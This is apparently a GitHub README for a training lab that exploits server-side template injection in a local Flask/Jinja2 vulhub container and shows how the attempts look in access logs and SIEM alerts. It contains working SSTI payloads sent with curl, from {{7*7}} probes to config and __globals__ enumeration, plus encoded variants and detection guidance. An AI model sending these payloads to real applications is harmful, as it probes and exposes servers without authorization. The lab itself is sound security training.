# flask-ssti-lab-demo

**Server-Side Template Injection (SSTI) exploitation workflow + SOC visibility practice.**

## 📌 Project Overview

This repository demonstrates how to exploit a **Server-Side Template Injection (SSTI)** vulnerability in a Flask application and how such attacks appear in logs and SIEM alerts.

The workflow simulates a real-world scenario:  
- An attacker sends malicious payloads to a web application  
- A SOC analyst detects and investigates the activity

---

## 🔎 Why This Project Matters

In cybersecurity and SOC (Security Operations Center) roles, SSTI is a critical web application vulnerability.

- Attackers can execute arbitrary code on the server  
- Simple payloads can escalate into full compromise (Remote Code Execution)  
- SOC analysts must recognize SSTI attempts in logs, WAF alerts, and SIEM rules

This project combines **offensive exploitation** with **defensive monitoring** into a repeatable, educational workflow.

---

## ⚙️ Workflow

### 1. Environment Setup (Kali Linux + Docker)

Clone the vulnerable lab and start the container:

```bash
git clone https://github.com/vulhub/vulhub.git
cd vulhub/flask/ssti
docker compose up -d
docker ps
```
→ Confirms the Flask app is running on port 8000.

### 2. Proof of Vulnerability
Basic request
```
curl "http://127.0.0.1:8000/?name=World"
```
Response: Hello World

Math expression, this proves template evaluation
```
curl "http://127.0.0.1:8000/?name={{7*7}}"
```
Response: Hello 49

String multiplication; this shows another confirmation with the command
```
curl "http://127.0.0.1:8000/?name={{7*'A'}}"
```
Response: Hello AAAAAAA
✅ Achievement: User input is being executed inside the Jinja2 template engine.
It means the application directly interprets whatever text a user enters as Jinja2 code, so instead of treating input as plain text, it executes logic, creating serious security risks.

### 3. Escalation Attempts
Probe deeper into the server environment:
Try to access Flask config (may cause error in some setups)
```
curl "http://127.0.0.1:8000/?name={{config.items()}}"
```
Expose globals and internals
```
curl "http://127.0.0.1:8000/?name={{self.__init__.__globals__}}"
```
In a normal situation, this usually exposes Python built-ins, Jinja2 internals, and loaded modules.
✅ Achievement: Moved from simple math to enumerating the server’s runtime environment.
### 4. How It Appears in SIEM / Logs
When payloads hit a production environment, they are logged and forwarded to SIEM/WAF.
```
127.0.0.1 - - [04/Feb/2026:16:40:12 +0100] "GET /?name={{7*7}} HTTP/1.1" 200 15 "-" "curl/7.88.1"
127.0.0.1 - - [04/Feb/2026:16:41:05 +0100] "GET /?name={{self.__init__.__globals__}} HTTP/1.1" 500 265 "-" "curl/7.88.1"
```
Encoded version which is common in real attacks:
```
GET /?name=%7B%7B7*7%7D%7D HTTP/1.1
GET /?name=%7B%7Bself.__init__.__globals__%7D%7D HTTP/1.1
```
The output on the Log is going to take this shape:
```
Alert: Suspicious SSTI Payload Detected
Rule: Web - Suspicious Template Expression
Source IP: 192.168.1.25
Request: GET /?name={{self.__init__.__globals__}}
Status: 500 Internal Server Error
User-Agent: curl/7.88.1
```
---

### 🛡️ SOC Analyst Benefits

SOC analysts benefit from this SSTI lab because it teaches them how to detect, assess, and respond to suspicious activity in a clear and practical way. First, detection awareness is critical. Analysts must learn to recognize unusual patterns in logs, such as `{{...}}` or their encoded form `%7B%7B...%7D%7D`. These are not normal user inputs but clear signs of template injection attempts. By practicing with these examples, analysts become more confident in spotting attacks in real environments.  

Second, severity assessment helps analysts judge how dangerous an attempt is. Simple math expressions like `{{7*7}}` are usually probes, showing that an attacker is testing the system. More advanced payloads, such as accessing `globals` or `config.items()`, indicate escalation and a move toward remote code execution. Analysts must separate harmless-looking probes from serious threats to prioritize responses correctly.  

Third, incident response is about knowing when to escalate. Repeated probes may require monitoring, but escalation attempts should trigger immediate alerts to the incident response or forensics team. This ensures potential compromises are contained quickly.  

Finally, the lab serves as a training resource. It shows analysts how SSTI attempts appear in access logs, proxy logs, and SIEM alerts, making it a valuable tool for building real-world defensive skills.  

